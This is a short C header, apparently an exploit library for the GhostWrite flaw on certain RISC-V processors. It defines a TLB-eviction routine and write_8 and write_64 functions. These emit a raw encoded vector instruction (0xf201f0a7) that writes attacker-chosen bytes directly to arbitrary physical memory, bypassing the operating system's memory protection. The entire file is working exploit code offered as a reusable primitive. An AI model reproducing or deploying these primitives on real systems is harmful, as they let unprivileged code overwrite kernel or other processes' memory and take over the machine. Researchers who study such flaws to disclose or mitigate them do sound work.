#include <string.h>
#include <inttypes.h>

#ifndef __ghostwrite_h__
#define __ghostwrite_h__

char __attribute__((aligned(4096))) buffer[2<<20];
    
inline __attribute__((always_inline)) void maccess(void *addr) {
  asm volatile("ld a7, (%0)" : : "r"(addr) : "a7", "memory");
}

// evict the TLB
void evict() {
  for (unsigned i = 0; i < sizeof(buffer); i+=4096) {
    maccess(&buffer[i]);
  }
  asm volatile("fence\n\t");
}

void evict_init() {
  memset(buffer, 0xff, sizeof(buffer));
}

void write_8(size_t phys_addr, uint8_t val) {
  evict();
  int vl = 8;
  asm volatile(\
    "vsetvli %2, x0, e16, m1\n\t"
    "vmv.v.x v1, %1\n\t"
    "mv gp, %0\n\t"
    ".fill 1, 4, 0xf201f0a7\n\t"
    :: "r"(phys_addr), "r"(val), "r"(vl) : "a5", "gp");
  asm volatile("fence\n\t");
}

void write_64(size_t phys_addr, uint64_t val) {
  evict();
  int vl = 8;
  for (int i = 0; i < 8; i++) {
    asm volatile(\
      "vsetvli %2, x0, e16, m1\n\t"
      "vmv.v.x v1, %1\n\t"
      "mv gp, %0\n\t"
      ".fill 1, 4, 0xf201f0a7\n\t"
      :: "r"(phys_addr+i), "r"((val>>(8*i))&0xff), "r"(vl) : "a5", "gp");
  }
  asm volatile("fence\n\t");
}

#endif
